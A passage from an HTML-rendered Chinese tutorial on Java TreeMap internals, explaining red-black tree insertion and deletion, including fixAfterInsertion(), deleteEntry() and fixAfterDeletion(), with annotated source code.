punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//向左找</span>            p <span class="token operator">=</span> p<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//向右找</span>            p <span class="token operator">=</span> p<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h2><p><code>put(K key, V value)</code>方法是将指定的<code>key</code>, <code>value</code>对添加到<code>map</code>里。该方法首先会对<code>map</code>做一次查找，看是否包含该元组，如果已经包含则直接返回，查找过程类似于<code>getEntry()</code>方法；如果没有找到则会在红黑树中插入新的<code>entry</code>，如果插入之后破坏了红黑树的约束条件，还需要进行调整（旋转，改变某些节点的颜色）。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> cmp<span class="token punctuation">;</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> parent<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Comparable<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> K<span class="token operator">></span> k <span class="token operator">=</span> <span class="token punctuation">(</span>Comparable<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> K<span class="token operator">></span><span class="token punctuation">)</span> key<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用元素的自然顺序</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        parent <span class="token operator">=</span> t<span class="token punctuation">;</span>        cmp <span class="token operator">=</span> k<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> t <span class="token operator">=</span> t<span class="token punctuation">.</span>left<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向左找</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> t <span class="token operator">=</span> t<span class="token punctuation">.</span>right<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//向右找</span>        <span class="token keyword">else</span> <span class="token keyword">return</span> t<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>t <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建并插入新的entry</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> parent<span class="token punctuation">.</span>left <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token keyword">else</span> parent<span class="token punctuation">.</span>right <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token function">fixAfterInsertion</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调整</span>    size<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上述代码的插入部分并不难理解：首先在红黑树上找到合适的位置，然后创建新的<code>entry</code>并插入（当然，新插入的节点一定是树的叶子）。难点是调整函数<code>fixAfterInsertion()</code>，前面已经说过，调整往往需要1.改变某些节点的颜色，2.对某些节点进行旋转。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_put.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_put.png" alt="TreeMap_put.png"></a></p><p>调整函数<code>fixAfterInsertion()</code>的具体代码如下，其中用到了上文中提到的<code>rotateLeft()</code>和<code>rotateRight()</code>函数。通过代码我们能够看到，情况2其实是落在情况3内的。情况4～情况6跟前三种情况是对称的，因此图解中并没有画出后三种情况，读者可以参考代码自行理解。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//红黑树调整函数fixAfterInsertion()</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">fixAfterInsertion</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    x<span class="token punctuation">.</span>color <span class="token operator">=</span> RED<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> x <span class="token operator">!=</span> root <span class="token operator">&amp;&amp;</span> x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>color <span class="token operator">==</span> RED<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> y <span class="token operator">=</span> <span class="token function">rightOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> RED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 情况1</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 情况1</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 情况1</span>                x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 情况1</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token function">rightOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 情况2</span>                    <span class="token function">rotateLeft</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">// 情况2</span>                <span class="token punctuation">}</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 情况3</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 情况3</span>                <span class="token function">rotateRight</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 情况3</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> y <span class="token operator">=</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> RED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 情况4</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 情况4</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 情况4</span>                x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 情况4</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 情况5</span>                    <span class="token function">rotateRight</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 情况5</span>                <span class="token punctuation">}</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 情况6</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 情况6</span>                <span class="token function">rotateLeft</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 情况6</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    root<span class="token punctuation">.</span>color <span class="token operator">=</span> BLACK<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h2><p><code>remove(Object key)</code>的作用是删除<code>key</code>值对应的<code>entry</code>，该方法首先通过上文中提到的<code>getEntry(Object key)</code>方法找到<code>key</code>值对应的<code>entry</code>，然后调用<code>deleteEntry(Entry&lt;K,V&gt; entry)</code>删除对应的<code>entry</code>。由于删除操作会改变红黑树的结构，有可能破坏红黑树的约束条件，因此有可能要进行调整。</p><p><code>getEntry()</code>函数前面已经讲解过，这里重点放<code>deleteEntry()</code>上，该函数删除指定的<code>entry</code>并在红黑树的约束被破坏时进行调用<code>fixAfterDeletion(Entry&lt;K,V&gt; x)</code>进行调整。</p><p><strong>由于红黑树是一棵增强版的二叉查找树，红黑树的删除操作跟普通二叉查找树的删除操作也就非常相似，唯一的区别是红黑树在节点删除之后可能需要进行调整</strong>。现在考虑一棵普通二叉查找树的删除过程，可以简单分为两种情况：</p><blockquote><ol><li>删除点p的左右子树都为空，或者只有一棵子树非空。</li><li>删除点p的左右子树都非空。</li></ol></blockquote><p>对于上述情况1，处理起来比较简单，直接将p删除（左右子树都为空时），或者用非空子树替代p（只有一棵子树非空时）；对于情况2，可以用p的后继s（树中大于x的最小的那个元素）代替p，然后使用情况1删除s（此时s一定满足情况1.可以画画看）。</p><p>基于以上逻辑，红黑树的节点删除函数<code>deleteEntry()</code>代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 红黑树entry删除函数deleteEntry()</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">deleteEntry</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    size<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>left <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 2. 删除点p的左右子树都非空。</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> s <span class="token operator">=</span> <span class="token function">successor</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 后继</span>        p<span class="token punctuation">.</span>key <span class="token operator">=</span> s<span class="token punctuation">.</span>key<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>value <span class="token operator">=</span> s<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        p <span class="token operator">=</span> s<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> replacement <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>left <span class="token operator">!=</span> null <span class="token operator">?</span> p<span class="token punctuation">.</span>left <span class="token operator">:</span> p<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>replacement <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 1. 删除点p只有一棵子树非空。</span>        replacement<span class="token punctuation">.</span>parent <span class="token operator">=</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span>            root <span class="token operator">=</span> replacement<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left  <span class="token operator">=</span> replacement<span class="token punctuation">;</span>        <span class="token keyword">else</span>            p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> replacement<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>left <span class="token operator">=</span> p<span class="token punctuation">.</span>right <span class="token operator">=</span> p<span class="token punctuation">.</span>parent <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>            <span class="token function">fixAfterDeletion</span><span class="token punctuation">(</span>replacement<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调整</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        root <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 1. 删除点p的左右子树都为空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>color <span class="token operator">==</span> BLACK<span class="token punctuation">)</span>            <span class="token function">fixAfterDeletion</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 调整</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left<span class="token punctuation">)</span>                p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right<span class="token punctuation">)</span>                p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> null<span class="token punctuation">;</span>            p<span class="token punctuation">.</span>parent <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上述代码中占据大量代码行的，是用来修改父子节点间引用关系的代码，其逻辑并不难理解。下面着重讲解删除后调整函数<code>fixAfterDeletion()</code>。首先请思考一下，删除了哪些点才会导致调整？<strong>只有删除点是BLACK的时候，才会触发调整函数</strong>，因为删除RED节点不会破坏红黑树的任何约束，而删除BLACK节点会破坏规则4。</p><p>跟上文中讲过的<code>fixAfterInsertion()</code>函数一样，这里也要分成若干种情况。记住，<strong>无论有多少情况，具体的调整操作只有两种：1.改变某些节点的颜色，2.对某些节点进行旋转。</strong></p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_fixAfterDeletion.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_fixAfterDeletion.png" alt="TreeMap_fixAfterDeletion.png"></a></p><p>上述图解的总体思想是：将情况1首先转换成情况2，或者转换成情况3和情况4。当然，该图解并不意味着调整过程一定是从情况1开始。通过后续代码我们还会发现几个有趣的规则：a).如果是由情况1之后紧接着进入的情况2，那么情况2之后一定会退出循环（因为x为红色）；b).一旦进入情况3和情况4，一定会退出循环（因为x为root）。</p><p>删除后调整函数<code>fixAfterDeletion()</code>的具体代码如下，其中用到了上文中提到的<code>rotateLeft()</code>和<code>rotateRight()</code>函数。通过代码我们能够看到，情况3其实是落在情况4内的。情况5～情况8跟前四种情况是对称的，因此图解中并没有画出后四种情况，读者可以参考代码自行理解。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">fixAfterDeletion</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> root <span class="token operator">&amp;&amp;</span> <span class="token function">colorOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> BLACK<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> sib <span class="token operator">=</span> <span class="token function">rightOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span> <span class="token operator">==</span> RED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 情况1</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 情况1</span>                <span class="token function">rotateLeft</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 情况1</span>                sib <span class="token operator">=</span> <span class="token function">rightOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 情况1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">leftOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">==</span> BLACK <span class="token operator">&amp;&amp;</span>                <span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">rightOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> BLACK<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// 情况2</span>                x <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// 情况2</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">rightOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> BLACK<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">leftOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 情况3</span>                    <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">// 情况3</span>                    <span class="token function">rotateRight</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 情况3</span>                    sib <span class="token operator">=</span> <span class="token function">rightOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 情况3</span>                <span class="token punctuation">}</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> <span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 情况4</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 情况4</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">rightOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 情况4</span>                <span class="token function">rotateLeft</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 情况4</span>                x <span class="token operator">=</span> root<span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 情况4</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 跟前四种情况对称</span>            Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> sib <span class="token operator">=</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span> <span class="token operator">==</span> RED<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setColor</span><span class="token punctuation">(</span>sib<span class="token punctuation">,</span> BLACK<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 情况5</span>                <span class="token function">setColor</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 情况5</span>                <span class="token function">rotateRight</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 情况5</span>                sib <span class="token operator">=</span> <span class="token function">leftOf</span><span class="token punctuation">(</span><span class="token function">parentOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 情况5</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">rightOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> BLACK <span class="token operator">&amp;&amp;</span>                <span class="token function">colorOf</span><span class="token punctuation">(</span><span class="token function">leftOf</span><span class="token punctuation">(</span>sib<span class="token punctuation">)</span><span class="token punctuation">)</span> 